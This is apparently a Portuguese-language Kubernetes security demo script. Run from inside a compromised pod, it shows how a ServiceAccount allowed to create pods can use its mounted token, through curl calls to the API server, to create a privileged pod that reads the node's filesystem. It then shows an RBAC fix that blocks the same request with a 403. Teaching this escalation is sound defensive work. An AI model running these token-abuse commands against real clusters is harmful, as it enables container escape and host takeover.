Cavaleiro II — Executar

Privileged Containers

Service Account · RBAC · Privilege Escalation
"Não precisa de root no host. Precisa do token certo. Você não escreveu privileged — o RBAC deixou o atacante escrever."
Rode a partir de: demo/cavaleiro-2-privileged/  ·  tudo é executado de dentro do pod comprometido
1

O cenário: um app que pode "create pods"

"Uma ServiceAccount com permissão de criar pods — 'o app orquestra workers'. Parece inofensivo."
kubectl apply -f cenario.yaml

→ Um pod normal sobe, com uma SA que pode create pods.

2

De dentro do pod, o token já fala com a API interna

"O atacante não invade o API server de fora. Ele já está no pod — e o pod nasceu com o token montado e a rota para a API."
kubectl -n c2-privileged exec app-comprometido -- sh -c \
  'curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/version'

→ A API responde. Sem kubectl externo, sem kubeconfig — só o token montado.

3

Escalada: criar o pod privilegiado via API

"Você nunca escreveu privileged: true. Não precisou — bastou a SA poder criar pods."
kubectl -n c2-privileged exec -i app-comprometido -- sh -c \
  'curl -sk -X POST -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -H "Content-Type: application/yaml" https://kubernetes.default.svc/api/v1/namespaces/c2-privileged/pods --data-binary @-' \
  < pod-privilegiado.yaml

→ A API responde 201: o atacante criou um pod privilegiado que monta o node.

4

Prova: o pod do atacante lê o node

kubectl -n c2-privileged exec pod-do-atacante -- cat /host/etc/os-release

→ Sai o sistema do node (não do container). O host está exposto.

5

A defesa: RBAC sem "create"

"A correção não é proibir privileged. É tirar do app o poder que ele nunca precisou."
kubectl apply -f defesa.yaml

→ O mesmo Role, agora só com get/list. O token continua válido, mas sem o poder perigoso.

6

O mesmo ataque, agora negado

kubectl -n c2-privileged exec -i app-comprometido -- sh -c \
  'curl -sk -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -H "Content-Type: application/yaml" https://kubernetes.default.svc/api/v1/namespaces/c2-privileged/pods --data-binary @-' \
  < pod-privilegiado.yaml

✗ 403 — mesmo token, mesma chamada, agora Forbidden. Mudou o que a credencial tem direito de fazer.

Camadas extras: automountServiceAccountToken: false nem monta o token; PSS/Kyverno barram o pod privilegiado mesmo que o RBAC falhe; user namespaces (1.36) cortam o escape de kernel.

Reset

kubectl delete -f pod-privilegiado.yaml -f cenario.yaml --ignore-not-found
